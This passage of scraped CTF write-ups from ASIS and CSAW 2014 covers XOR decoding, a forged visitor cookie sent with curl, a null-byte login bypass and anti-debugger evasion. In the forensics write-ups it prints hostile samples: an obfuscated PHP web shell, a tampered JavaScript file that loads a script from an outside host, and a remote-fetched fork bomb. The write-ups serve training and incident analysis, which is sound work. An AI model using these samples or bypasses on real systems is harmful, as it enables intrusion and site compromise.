to bruteforcing the first byte. Using that guessed first byte, I took the second _encoded_ byte of ```flag.enc```, XOR'd it and got the second decoded byte. That second decoded byte XOR'd with the third _encoded_ byte from flag.enc gives the third decoded byte, and so on. I wrote the following Python script:\n\n```\n#!/usr/bin/python\n\nwith open('flag.enc') as f:\n\to_data = f.read()\n\tf.close()\n\nfor k in range(256):\n\tdata = o_data\n\tdecoded = chr(k)\n\n\tnextChar = k\n\tfor i in range(len(data)):\n\t\tnextChar = ord(data[i]) ^ nextChar\n\t\tdecoded += chr(nextChar)\n\n\twith open(chr(k)), 'w') as out:\n\t\tout.write(decoded)\n```\n\nThis loops through all the possible first bytes, decodes the data in the manner superkojiman described and dumps the data in a file. Next, I ran file on all the decoded files:\n\n![](/images/2014/asis-finals/lioncub/03.png)\n\nThat ```31``` file looked interesting, seeing as it was a gzipped file containing... flag.png? Let's extract it!\n\n![](/images/2014/asis-finals/lioncub/04.png)\n\nAh, a QR code. Surely, the flag was in there! I scanned it with my phone and got:\n\n```text\n1f8b0808928d2f540003666c61672e706e67000192016dfe89504e470d0a\n1a0a0000000d494844520000006f0000006f0103000000d80b0c23000000\n06504c5445000000ffffffa5d99fdd0000000274524e53ffffc8b5dfc700\n0000097048597300000b1200000b1201d2dd7efc0000012449444154388d\nd5d431ae84201006e079b1a0d30b90cc35e8b8925e40e5027a253aae41e2\n05b0a320ce1bb2bbef651b87668b25167e0501867f007a1bf01d4c004be8\n76af0150e449650a71087aa1067afee9762aa36ae2a8746f7523674bbb2f\n4de4250c12fd6ff2867cde2968fefe8e7f431e17943af155d81b26d06068\nb3dd661a68d005987cfc219997e23b8ab3c24bc9a4808e3acab4da065204\na541e166506402e4592ec71148e499cbe0f914b42a99c91eb59221824591\ne4613475b9dd93c804e4087a13472bf3ac05e7781f6b0b0326551be77147\n02b35e38540a0064f2481c6fc2d3cbe4c472bc5dd613c9e45e98a10c19cf\n576bdc915b9213cbbb524d9c88d73ab667ad44d667e419957b72ffdace79\nbc8ccc47fff696eb2ff3734feea7f80bb686232e7a493424000000004945\n4e44ae426082fb73fb8e92010000\n```\n\nHmm. I dumped this into a file using ```xxd```:\n\n```\necho -ne '1f8b0808928d2f540003666c61672e706e67000192016dfe89\n504e470d0a1a0a0000000d494844520000006f0000006f0103000000d80b\n0c2300000006504c5445000000ffffffa5d99fdd0000000274524e53ffff\nc8b5dfc7000000097048597300000b1200000b1201d2dd7efc0000012449\n444154388dd5d431ae84201006e079b1a0d30b90cc35e8b8925e40e5027a\n253aae41e205b0a320ce1bb2bbef651b87668b25167e0501867f007a1bf0\n1d4c004be876af0150e449650a71087aa1067afee9762aa36ae2a8746f75\n23674bbb2f4de4250c12fd6ff2867cde2968fefe8e7f431e17943af155d8\n1b26d06068b3dd661a68d005987cfc219997e23b8ab3c24bc9a4808e3aca\nb4da065204a541e166506402e4592ec71148e499cbe0f914b42a99c91eb5\n9221824591e4613475b9dd93c804e4087a13472bf3ac05e7781f6b0b0326\n551be7714702b35e38540a0064f2481c6fc2d3cbe4c472bc5dd613c9e45e\n98a10c19cf576bdc915b9213cbbb524d9c88d73ab667ad44d667e419957b\n72ffdace79bc8ccc47fff696eb2ff3734feea7f80bb686232e7a49342400\n00000049454e44ae426082fb73fb8e92010000' |xxd -r -p > flag2\n```\n\n```file``` revealed yet another gzipped file. After decompression, I found another PNG:\n\n![](/images/2014/asis-finals/lioncub/05.png)\n\nI scanned it again, and this time, it was jackpot!\n\nFlag: ```ASIS_e87b556efc59f8351aec0858da850906```\n\nAgain, I couldn't have gotten the flag without the brilliant reverse-engineering-fu of superkojiman!\n", "timestamp": "2025-10-24T11:40:11.291464"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/asis/lottery.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/asis/lottery.md", "content": "### Solved by barrebas\n\nLottery was a 100 point web challenge in the ASIS Finals CTF. The description only said 'Go here: http://asis-ctf.ir:12437'. That webpage was mostly non-functional, but said that the 1234567890th visitor would win a *prize*. Gee, I wonder what that is? My browser informed me that there were no cookies, but I wasn't convinced.\n\n![](/images/2014/asis-finals/lottery/01.png)\n\nI turned to ```curl```. Luckily, curl informed me that there was indeed a cookie been set. A cookie named 'Visitor', no less:\n\n![](/images/2014/asis-finals/lottery/02.png)\n\nThe value looked like base64 so I decoded it:\n\n```\n$ echo -ne 'MTM4NjozNjM3NjNlNWMzZGMzYTY4YjM5OTA1OGMzNGFlY2YyYw==' |base64 -d\n1386:363763e5c3dc3a68b399058c34aecf2c\n```\n\nHmm. I figured that first number was a visitor number. What could the second string be? MD5 maybe?\n\n```\n$ echo -ne 1386 |md5sum\n363763e5c3dc3a68b399058c34aecf2c  -\n```\n\nSpot on. It's now easy to fake the right cookie:\n\n```\n$ echo -ne 1234567890 |md5sum\ne807f1fcf82d132f9bb018ca6738a19f  -\n$ echo -ne '1234567890:e807f1fcf82d132f9bb018ca6738a19f' |base64\nMTIzNDU2Nzg5MDplODA3ZjFmY2Y4MmQxMzJmOWJiMDE4Y2E2NzM4YTE5Zg==\n```\n\nAnd feed it into curl:\n\n```\n$ curl -v http://asis-ctf.ir:12437/ --cookie \"Visitor=MTIzNDU2Nzg5MDplODA3ZjFmY2Y4MmQxMzJmOWJiMDE4Y2E2NzM4YTE5Zg==\"\n* About to connect() to asis-ctf.ir port 12437 (#0)\n*   Trying 87.107.124.12...\n* connected\n* Connected to asis-ctf.ir (87.107.124.12) port 12437 (#0)\n> GET / HTTP/1.1\n> User-Agent: curl/7.26.0\n> Host: asis-ctf.ir:12437\n> Accept: */*\n> Cookie: Visitor=MTIzNDU2Nzg5MDplODA3ZjFmY2Y4MmQxMzJmOWJiMDE4Y2E2NzM4YTE5Zg==\n>\n...snip...\nGoogle+\"></a> </div></div><div class=\"data-wrapper\"><p class=\"title\">The 1234567890 th visitor, the prize awarded.</p><div class=\"content\">Anyone who has visited our site is the 1234567890 th Special prizes are awarded. <br/>the flag is: ASIS_9f1af649f25108144fc38a01f8767c0c</div></div><div class=\"footer\"><div class=\"p\n```\n\nThe flag is ```ASIS_9f1af649f25108144fc38a01f8767c0c```. Easy!\n\n\n", "timestamp": "2025-10-24T11:40:11.476610"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/asis/secure-hobby.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/asis/secure-hobby.md", "content": "### Solved by barrebas\n\nFor Secure Hobby, a 250 point challenge, we where given a file and a place to connect to. The archive contained a binary, which looked okay enough to run. It opened a port on localhost. Upon connecting using ```nc```, the program first crashes because it can't find ```flag``` and ```namak```. After creating those files and connecting again, we are presented with the following:\n\n```bash\n$ nc localhost 35565\n-------------------------------------------------\n| \tWelcome to Super Secure Auth Engine\t|\n-------------------------------------------------\n\n1) Register\n2) Login check\n3) Show my secret\n\nEnjoy ;)\n1\nEnter username: test\nYour key for login is: 6447567a64413d3d098f6bcd4621d373cade4e832627b4f6\n```\n\nHmm. The second function verifies a login and the third displays a secret. Trying to register the user 'admin' resulted in an error. Still, it's fair to assume we need to get the secret of the admin user. Let's break this key down.\n\n```bash\n$ echo -ne 'test' |md5sum\n098f6bcd4621d373cade4e832627b4f6  -\n```\n\nThis looks like the last part of the login. What about the start? It seems to end with \\x3d, or ASCII ```=```. Screams base64!\n\n```bash\n$ xxd -p -r\n6447567a64413d3d\ndGVzdA==\n$ echo -ne 'dGVzdA==' |base64 -d\ntest\n```\n\nSo putting it all together again:\n\n\n```bash\n$ echo -ne 'admin' |base64\nYWRtaW4=\n$ echo -ne 'admin' |md5sum\n21232f297a57a5a743894a0e4a801fc3  -\nxxd -p\nYWRtaW4=\n595752746157343d0a\n```\n\nLooks like ```595752746157343d21232f297a57a5a743894a0e4a801fc3``` is the login we need!\n\nAlas, this doesn’t work. On the remote box, registering ```test``` returns:\n\n\n```bash\n$ nc asis-ctf.ir 12439\n-------------------------------------------------\n| \tWelcome to Super Secure Auth Engine\t|\n-------------------------------------------------\n\n1) Register\n2) Login check\n3) Show my secret\n\nEnjoy ;)\n1\nEnter username: test\nYour key for login is: 6447567a64413d3dd0211e3e26985465726312d056f9339f\n```\n\nIt has to do with the ```namak``` file. Namak is Persian for salt.\n\n```bash\n$ echo ‘0’ > namak\n```\n\nNow, registering test on the localhost server returns ```Your key for login is: 6447567a64413d3d1c13f2701648e0b0d46d8a2a5a131a53```.\n\nFurthermore, it looks like the salt is prepended to before hashing. We grabbed md5(salt) using a small Python script:\n\n\n```python\n#!/usr/bin/python\n\nfrom socket import *\nimport time, re, struct\n\ns = socket(AF_INET, SOCK_STREAM)\n#s.connect(('localhost', 35565))\ns.connect(('asis-ctf.ir', 12439))\n\nprint s.recv(256)\n\ns.send('1\\n')\nprint s.recv(256)\n\ns.send('\\n')\n\nprint s.recv(200)\nprint s.recv(200)\n```\n\nThe output showed:\n\n```bash\nEnter username:\nYour key for login is:\n5624717e9a5fd673f17f5678c6303ffe\n```\n\nSo the md5 of the salt would be ```5624717e9a5fd673f17f5678c6303ffe```. I enlisted the help of NullMode to crack this hash, but to no avail.\n\nInstead of cracking this hash (seems inpossible), we decided to focus on the string comparison. We cannot register a username containing ```admin```, but perhaps we can circumvent this checking system somehow. First, I tried:\n\n\n```\nadmin                                              #\n```\n\nBut this led to the same error message. Apparently, the username is not truncated. Instead, we assumed the check-string-for-admin uses normal string routines. These stop when they encounter a null-byte. Hash-functions on the other hand, do not. Let's register a user ```\\x00admin``` using Python:\n\n\n```python\n#!/usr/bin/python\n\nfrom socket import *\nimport time, re, struct\n\ns = socket(AF_INET, SOCK_STREAM)\n#s.connect(('localhost', 35565))\ns.connect(('asis-ctf.ir', 12439))\n\nprint s.recv(256)\n\ns.send('1\\n')\nprint s.recv(256)\n\ns.send('\\x00admin\\n')\n\nprint s.recv(200)\nprint s.recv(200)\n```\n\nThis little gem returned ```4147466b62576c7503812bbd45e23c059a0eab18e936b7ed```. Let's try it out!\n\n\n```bash\n$ nc asis-ctf.ir 12439\n-------------------------------------------------\n| \tWelcome to Super Secure Auth Engine\t|\n-------------------------------------------------\n\n1) Register\n2) Login check\n3) Show my secret\n\nEnjoy ;)\n2\nEnter key: 4147466b62576c7503812bbd45e23c059a0eab18e936b7ed\nOK\nUser admin authenticated\n```\n\nHoly crap, it worked! Let's grab that secret! Fingers crossed:\n\n\n```bash\n$ nc asis-ctf.ir 12439\n-------------------------------------------------\n| \tWelcome to Super Secure Auth Engine\t|\n-------------------------------------------------\n\n1) Register\n2) Login check\n3) Show my secret\n\nEnjoy ;)\n3\nEnter key: 4147466b62576c7503812bbd45e23c059a0eab18e936b7ed\nThe flag is: ASIS_65cc76f02093977bfd7629086e813666\n```\n\nBOOM! We just landed another flag :) This one was actually fun to solve!\n", "timestamp": "2025-10-24T11:40:11.671004"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/csaw/csaw2013reversing2-dot-exe.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/csaw/csaw2013reversing2-dot-exe.md", "content": "### Solved by superkojiman\n\nTime to switch to a Windows VM for this one. A binary csaw2013reversing2.exe is provided along with the following hint:\n\n> We got a little lazy so we just tweaked an old one a bit\n\nI executed the binary and was greeted with the following message box dialog:\n\n![](/images/2014/csaw/csaw2013reversing2/01.png)\n\nSo it looks like the flag is being printed out, except it's encrypted. I loaded it up in IDA Pro and examined the _main function. One of the first things that stood out was a call to isDebuggerPresent():\n\n![](/images/2014/csaw/csaw2013reversing2/02.png)\n\nThis function checks to see if the binary is being run within a debugger, and if it is, it takes the branch on the right which leads to a interrupt instruction (`int 3`) that triggers an exception handler that terminates the program. What's interesting is right after that instruction, there's call made to a function `sub_401000()` that never gets executed.\n\nExamining `sub_401000()` shows the following:\n\n![](/images/2014/csaw/csaw2013reversing2/03.png)\n\nSo what does this function do? It looked like it was XORing the contents of `[eax+ecx*4]` with the value in `esi` in a loop, which made me suspect that it was the function responsible for decrypting the flag.  I went ahead and ran the program in IDA's debugger and as expected, I hit the software breakpoint which terminated the program.\n\n\n![](/images/2014/csaw/csaw2013reversing2/04.png)\n\nTo bypass this, I set a breakpoint at 0x00401099 which is the `inc ecx` instruction right before `int 3`, and ran the program again. This time round, I hit the breakpoint right before `int 3` as expected, and changed the value of `eip` to 0x0040109b, which is the instruction right after `int 3`\n\n![](/images/2014/csaw/csaw2013reversing2/05.png)\n\nI could now step into the `sub_401000` function to see what was going on.\n\nHere's what it looks like right after stepping into `sub_401000`.\n\n![](/images/2014/csaw/csaw2013reversing2/06.png)\n\nI was interested in what the memory location referred to at `[edx+ecx*4]` was. This was the memory location that was being XORd in a loop with the value in `esi` (see address 0x0040101f). Hovering over this address showed that it pointed to 0x00381eac. I pulled up that location in the dump window:\n\n![](/images/2014/csaw/csaw2013reversing2/07.png)\n\nThat looks like it might be the encrypted flag! I set a breakpoint at 0x0040101f and continued execution. From here on I stepped over each instruction in the loop and watched the bytes in 0x00381eac transform into the flag:\n\n![](/images/2014/csaw/csaw2013reversing2/08.png)\n\nAnd so the flag is: **flag{reversing_is_not_that_hard}**\n\n", "timestamp": "2025-10-24T11:40:12.041774"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/csaw/eggshells.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/csaw/eggshells.md", "content": "### Solved by superkojiman\n\nThis challenge is worth 100 points and we're given a zip file called eggshells-master.zip along with the following hint:\n\n> I trust people on the internet all the time, do you?\n\nThe zip file contains a bunch of python scripts as well as one compiled python byte code:\n\n```\nroot@kali ~/Desktop/re100/eggshells-master\n# ls -l\ntotal 72\n-rwxr-xr-x 1 root root  1051 Sep 19 00:54 capstone.py\n-rwxr-xr-x 1 root root  1191 Sep 19 00:54 distorm.py\n-rwxr-xr-x 1 root root 29446 Sep 19 00:54 interpreter.py\n-rwxr-xr-x 1 root root  5439 Sep 19 00:54 main.py\ndrwxr-xr-x 3 root root  4096 Sep 19 00:30 nasm\n-rwxr-xr-x 1 root root  4086 Sep 19 00:54 nasm.py\n-rwxr-xr-x 1 root root   622 Sep 19 00:54 server.py\n-rwxr-xr-x 1 root root  2876 Sep 19 00:54 shellcode.py\n-rw-r--r-- 1 root root   245 Sep 18 23:51 utils.pyc\n-rwxr-xr-x 1 root root   107 Sep 19 00:55 wrapper.py\n```\n\nAttempting to run any of these python scripts would cause my machine to lock up; hence the hint provided.\n\nSince utils.pyc was the only one that stood out, I decided to run the strings command on it to see what would show up:\n\n```\nroot@kali ~/Desktop/re100/eggshells-master\n# strings utils.pyc\nurllib2s\nhttp://kchung.co/lol.pyN(\n__import__t\nurlopent\nread(\n/Users/kchung/Desktop/CSAW Quals 2014/rev100/utils.pyt\n<module>\n```\n\nLooks like it pulls down some python file called lol.py from http://kchung.co. I went ahead and downloaded lol.py and examined its contents:\n\n```\nroot@kali ~/Desktop/re100/eggshells-master\n# curl http://kchung.co/lol.py\nimport os\nwhile True:\n    try:\n        os.fork()\n    except:\n        os.system('start')\n# flag{trust_is_risky}\n```\n\nlol.py itself is a fork bomb which which gets downloaded and executed whenever any of the python scripts are run. This explains why my machine would become unresponsive.\n\nThe flag of course, is right at the bottom of lol.py: **flag{trust_is_risky}**\n\n\n\n", "timestamp": "2025-10-24T11:40:12.098657"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/csaw/fluffy-no-more.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/csaw/fluffy-no-more.md", "content": "### Solved by Swappage\n\nThe CSAW CTF 2014 wasn't only exploitation and reverse engineering, within the challenges a whole category was focused on forensics puzzles.\n\nFluffy No More was a 300 points worth challenge for which the solution could have been achieved by conducting a full scope forensics analysis of a compromised system.\n\nThe players were provided with an archive containing\n\n- a database dump\n- the content of /var/log\n- the content of /var/www/html\n- the content of /etc\n\nAll the informations were (badly imho) logically acquired from the compromised system, and the challenge was focused mostly on forensics methodology: if the player was good enaugh to understand what happened on the system, he'd find the hidden flag.\n\n<!-- more -->\n\nFirst thing first, let's say that this is how I solved the puzzle, probably there were other easier paths, but I still decided to approach this game like it was a real case, thinking that it was the best way to not leave anything behind.\n\nThe fictional scenario involved a compromised wordpress blog, so as a first step, i decided that it was worth to find a clue about how the attacker compromised it.\n\nI had the logs from the web server, but like in any webserver logs, when analyzing them you run through lots of false positives, and this was also the case; reason why I decided to start by looking at the database dump.\n\nTo make my life easier, i quickly imported the database and the blog site on a lab machine, and started looking into it:\nIt was a matter of no time that I could spot a comment to a blog post boasting about the will of compromising the site.\n\n![](/images/2014/csaw/fluffynomore/comment.png)\n\nI remembered that wordpress, in the comments table, has a field where the IP address of the posting user is saved, I decided to take a look at it, because i thought that it could have been useful in terms of correlations with the apache webserver logs. In most cases this is not gonna happen, you'll unlikely be so lucky, but I was approaching to a CTF problem, not a real world scenario, and so I decided to bet on this.\n\n\t+------------+----------------+-------------------+\n\t| comment_ID | comment_author | comment_author_IP |\n\t+------------+----------------+-------------------+\n\t|          4 | Hacker         | 192.168.127.130   |\n\t+------------+----------------+-------------------+\n\nMessing with the logs at this poit was a possibility, but i decided that probably if I had more details on the wordpress installation itself, this would have helped me out more in filtering the log results.\n\nI reset my instance of the blog and logged in as admin to check for the list of installed plugins, and verify if at least one of them was vulnerable.\n\n![](/images/2014/csaw/fluffynomore/mailpoet.png)\n\nMail Poet newsletter pulled my attention as it was the only plugin that was alerting that a new version was available, so why not look in public repositories if an exploit for the installed version is available?\n\nI browsed exploit-db and it resulted that a metasploit module to gain remote code execution on this specific wordpress plugin is available.\n\n![](/images/2014/csaw/fluffynomore/edb.png)\n\nBy a quick look at the exploit code, it's possible to figure out that an attacker can upload an arbitrary payload by sending the following POST request\n\n```ruby\nres = send_request_cgi({\n  'method'   => 'POST',\n  'uri'      => uri,\n  'ctype'    => \"multipart/form-data; boundary=#{data.bound}\",\n  'vars_get' => { 'page' => 'wysija_campaigns', 'action' => 'themes' },\n  'data'     => post_data\n})\n```\n\nand if we look at the apache access log, we could find:\n\n\t192.168.127.140 - - [16/Sep/2014:20:42:54 +0000] \"POST /wp-admin/admin-post.php?page=wysija_campaigns&action=themes HTTP/1.1\" 302 385 \"-\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\"\n\nOk, now let's see if we can find the uploaded malicious file, according to the exploit code, the call for the payload is done as follows:\n\n```ruby\n\tpayload_uri = normalize_uri(target_uri.path, 'wp-content', 'uploads', 'wysija', 'themes', theme_name, payload_name)\n```\n\nso by grepping the logs again we could find\n\n\t192.168.127.140 - - [16/Sep/2014:20:42:54 +0000] \"GET /wp-content/uploads/wysija/themes/weblizer/template.php HTTP/1.1\" 200 165 \"-\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\n\nLet's give a look at this file, it's most likely gonna be malicious, and in fact\n\n```php\n<?php\n$hije = str_replace(\"ey\",\"\",\"seyteyrey_reyeeypleyaeyceye\");\n$andp=\"JsqGMsq9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYSsqk9PSdoYScgJisqYgsqJsqGMoJ\";\n$rhhm=\"nsqKSwgam9pbihhcnJheV9zbGljZSgkYSwksqYygkYSksqtMykpKSksqpO2VjaG8sqgJsqzwvJy4kay4nPic7fQ==\";\n$pvqw=\"GEpPjMpeyRrPSdja2l0JztlY2hvICc8Jy4kaysq4nPicsq7ZXZhbChsqiYXNlNjRfZGVjb2RlKHByZsqWdfcmVw\";\n$wfrm=\"bGFjZShhcnsqJheSsqgsqnsqL1teXHcsq9XHNdLycsJy9ccy8nKSwgYsqXJyYXksqoJycsJyssq\";\n$vyoh = $hije(\"n\", \"\", \"nbnansne64n_ndnecode\");\n$bpzy = $hije(\"z\",\"\",\"zczreaztzez_zfzuznzcztzizon\");\n$xhju = $bpzy('', $vyoh($hije(\"sq\", \"\", $andp.$pvqw.$wfrm.$rhhm))); $xhju();\n?>\n```\n\nThis is definitely a web shell, and by looking at it, it's most likely a weevely web shell: weevely web shell is evil to investigate, because it doesn't use get or post parameters to send commands, but as opposite it uses cookies, which are not logged in the webserver logs.\n\nSo from now on, understanding what happened was a real deal.\n\nThe attacker managed to obtain remote code execution on the server, but what would an attacker do from there on?\n\nIt's fair to assume that he might have tried to maintain access on the server, and potentially to install backdoors or spread malwares using the site; I was at a dead end tho, I couldn't follow a logical step forward anymore, so what i was left to do was to look at the logs with a greedy approach to see if i could find something interesting.\n\nAnd it was while i was looking at /var/log/auth.log that I noticed a bunch of weird sudo activities by the ubuntu user using sudo.\n\n\tSep 17 19:18:45 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/bin/chgrp -R www-data /var/www/\n\tSep 17 19:18:45 ubuntu sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)\n\tSep 17 19:18:45 ubuntu sudo: pam_unix(sudo:session): session closed for user root\n\tSep 17 19:18:53 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/bin/chmod -R 775 /var/www/\n\tSep 17 19:18:53 ubuntu sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)\n\tSep 17 19:18:53 ubuntu sudo: pam_unix(sudo:session): session closed for user root\n\tSep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js\n\tSep 17 19:20:09 ubuntu sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)\n\tSep 17 19:20:22 ubuntu sudo: pam_unix(sudo:session): session closed for user root\n\tSep 17 19:20:55 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/find /var/www/html/ * touch {}\n\nwhat was going on here? why would the administrator tamper timestamps that badly? and most importantly, what was that vi on /var/www/html/wp-content/themes/twentythirteen/js/html5.js ?\n\nGiving a quick look at that file revealed something extremely suspicious: the file looked like an obfuscated javascript:\n\n```javascript\n(function(l, f) {\n\tfunction m() {\n\t\tvar a = e.elements;\n\t\treturn \"string\" == typeof a ? a.split(\" \") : a\n\t}\n\n\tfunction i(a) {\n\t\tvar b = n[a[o]];\n\t\tb || (b = {}, h++, a[o] = h, n[h] = b);\n\t\treturn b\n\t}\n\n\tfunction p(a, b, c) {\n\t\tb || (b = f);\n\t\tif (g) return b.createElement(a);\n\t\tc || (c = i(b));\n\t\tb = c.cache[a] ? c.cache[a].cloneNode() : r.test(a) ? (c.cache[a] = c.createElem(a)).cloneNode() : c.createElem(a);\n\t\treturn b.canHaveChildren && !s.test(a) ? c.frag.appendChild(b) : b\n\t}\n\n\tfunction t(a, b) {\n\t\tif (!b.cache) b.cache = {}, b.createElem = a.createElement, b.createFrag = a.createDocumentFragment, b.frag = b.createFrag();\n\t\ta.createElement = function(c) {\n\t\t\treturn !e.shivMethods ? b.createElem(c) : p(c, a, b)\n\t\t};\n\t\ta.createDocumentFragment = Function(\"h,f\", \"return function(){var n=f.cloneNode(),c=n.createElement;h.shivMethods&&(\" + m().join().replace(/[\\w\\-]+/g, function(a) {\n\t\t\tb.createElem(a);\n\t\t\tb.frag.createElement(a);\n\t\t\treturn 'c(\"' + a + '\")'\n\t\t}) + \");return n}\")(e, b.frag)\n\t}\n\n\tfunction q(a) {\n\t\ta || (a = f);\n\t\tvar b = i(a);\n\t\tif (e.shivCSS && !j && !b.hasCSS) {\n\t\t\tvar c, d = a;\n\t\t\tc = d.createElement(\"p\");\n\t\t\td = d.getElementsByTagName(\"head\")[0] || d.documentElement;\n\t\t\tc.innerHTML = \"x<style>article,aside,dialog,figcaption,figure,footer,header,hgroup,main,nav,section{display:block}mark{background:#FF0;color:#000}template{display:none}</style>\";\n\t\t\tc = d.insertBefore(c.lastChild, d.firstChild);\n\t\t\tb.hasCSS = !!c\n\t\t}\n\t\tg || t(a, b);\n\t\treturn a\n\t}\n\tvar k = l.html5 || {},\n\t\ts = /^<|^(?:button|map|select|textarea|object|iframe|option|optgroup)$/i,\n\t\tr = /^(?:a|b|code|div|fieldset|h1|h2|h3|h4|h5|h6|i|label|li|ol|p|q|span|strong|style|table|tbody|td|th|tr|ul)$/i,\n\t\tj, o = \"_html5shiv\",\n\t\th = 0,\n\t\tn = {},\n\t\tg;\n\t(function() {\n\t\ttry {\n\t\t\tvar a = f.createElement(\"a\");\n\t\t\ta.innerHTML = \"<xyz></xyz>\";\n\t\t\tj = \"hidden\" in a;\n\t\t\tvar b;\n\t\t\tif (!(b = 1 == a.childNodes.length)) {\n\t\t\t\tf.createElement(\"a\");\n\t\t\t\tvar c = f.createDocumentFragment();\n\t\t\t\tb = \"undefined\" == typeof c.cloneNode ||\n\t\t\t\t\t\"undefined\" == typeof c.createDocumentFragment || \"undefined\" == typeof c.createElement\n\t\t\t}\n\t\t\tg = b\n\t\t} catch (d) {\n\t\t\tg = j = !0\n\t\t}\n\t})();\n\tvar e = {\n\t\telements: k.elements || \"abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video\",\n\t\tversion: \"3.7.0\",\n\t\tshivCSS: !1 !== k.shivCSS,\n\t\tsupportsUnknownElements: g,\n\t\tshivMethods: !1 !== k.shivMethods,\n\t\ttype: \"default\",\n\t\tshivDocument: q,\n\t\tcreateElement: p,\n\t\tcreateDocumentFragment: function(a, b) {\n\t\t\ta || (a = f);\n\t\t\tif (g) return a.createDocumentFragment();\n\t\t\tfor (var b = b || i(a), c = b.frag.cloneNode(), d = 0, e = m(), h = e.length; d < h; d++) c.createElement(e[d]);\n\t\t\treturn c\n\t\t}\n\t};\n\tl.html5 = e;\n\tq(f)\n})(this, document);\nvar g = \"ti\";\nvar c = \"HTML Tags\";\nvar f = \". li colgroup br src datalist script option .\";\nf = f.split(\" \");\nc = \"\";\nk = \"/\";\nm = f[6];\nfor (var i = 0; i < f.length; i++) {\n\tc += f[i].length.toString();\n}\nv = f[0];\nx = \"\\ 'ht\";\nb = f[4];\nf = 2541 * 6 - 35 + 46 + 12 - 15269;\nc += f.toString();\nf = (56 + 31 + 68 * 65 + 41 - 548) / 4000 - 1;\nc += f.toString();\nf = \"\";\nc = c.split(\"\");\nvar w = 0;\nu = \"s\";\nfor (var i = 0; i < c.length; i++) {\n\tif (((i == 3 || i == 6) && w != 2) || ((i == 8) && w == 2)) {\n\t\tf += String.fromCharCode(46);\n\t\tw++;\n\t}\n\tf += c[i];\n}\ni = k + \"anal\";\ndocument.write(\"<\" + m + \" \" + b + \"=\" + x + \"tp:\" + k + k + f + i + \"y\" + g + \"c\" + u + v + \"j\" + u + \"\\ '>\\ </\" + m + \"\\ >\");\n```\n\n_Note: We had to insert a few spaces in places (line 101 & 119) to fix a few rendering issues._\n\nThe purpose of this javascript was to redirect the user to the following URL\n\n\thttp://128.238.66.100/announcement.pdf\n\nupon execution.\n\nThe PDF, when opened into a viewer looked as follow:\n\n![](/images/2014/csaw/fluffynomore/pdf.png)\n\nand at a first look it looked just like an image of a wizard with text on it.\n\nBut it for sure was hiding something, the usage of PDF with attached malicious content is very common in waterhole attacks, so why not giving it a closer look with PDF analysis tools like peepdf?\n\n\t# peepdf -i announcement.pdf\n\tWarning: Spidermonkey is not installed!!\n\tWarning: pylibemu is not installed!!\n\n\tFile: announcement.pdf\n\tMD5: 02794f436a5bb6100e2fe67714cf5933\n\tSHA1: 322e70a561aeee3833145d7f0942c8e32fe24241\n\tSize: 390303 bytes\n\tVersion: 1.4\n\tBinary: True\n\tLinearized: False\n\tEncrypted: False\n\tUpdates: 0\n\tObjects: 9\n\tStreams: 4\n\tComments: 0\n\tErrors: 0\n\n\tVersion 0:\n\t\tCatalog: 6\n\t\tInfo: 7\n\t\tObjects (9): [1, 2, 3, 4, 5, 6, 7, 8, 9]\n\t\tStreams (4): [1, 2, 3, 8]\n\t\t\tEncoded (4): [1, 2, 3, 8]\n\t\tSuspicious elements:\n\t\t\t/Names: [6]\n\t\t\t/EmbeddedFiles: [6]\n\t\t\t/EmbeddedFile: [8]\n\nWow, so many objects,  it was really worth looking at it one by one more closely, because in fact in the 8th one we could spot:\n\n\tPPDF> object 8\n\n\t<< /Length 212\n\t/Type /EmbeddedFile\n\t/Filter /FlateDecode\n\t/Params << /Size 495\n\t/Subtype /application/pdf >>\n\tstream\n\tvar _0xee0b=[\"\\x59\\x4F\\x55\\x20\\x44\\x49\\x44\\x20\\x49\\x54\\x21\\x20\\x43\\x4F\\x4E\\x47\\x52\\x41\\x54\\x53\\x21\\x20\\x66\\x77\\x69\\x77\\x2C\\x20\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x20\\x6F\\x62\\x66\\x75\\x73\\x63\\x61\\x74\\x69\\x6F\\x6E\\x20\\x69\\x73\\x20\\x73\\x6F\\x66\\x61\\x20\\x6B\\x69\\x6E\\x67\\x20\\x64\\x75\\x6D\\x62\\x20\\x20\\x3A\\x29\\x20\\x6B\\x65\\x79\\x7B\\x54\\x68\\x6F\\x73\\x65\\x20\\x46\\x6C\\x75\\x66\\x66\\x79\\x20\\x42\\x75\\x6E\\x6E\\x69\\x65\\x73\\x20\\x4D\\x61\\x6B\\x65\\x20\\x54\\x75\\x6D\\x6D\\x79\\x20\\x42\\x75\\x6D\\x70\\x79\\x7D\"];var y=_0xee0b[0];\n\tendstream\n\nThe hex encoded text looked promising...\n\n\t# python\n\tPython 2.7.3 (default, Mar 14 2014, 11:57:14)\n\t[GCC 4.7.2] on linux2\n\tType \"help\", \"copyright\", \"credits\" or 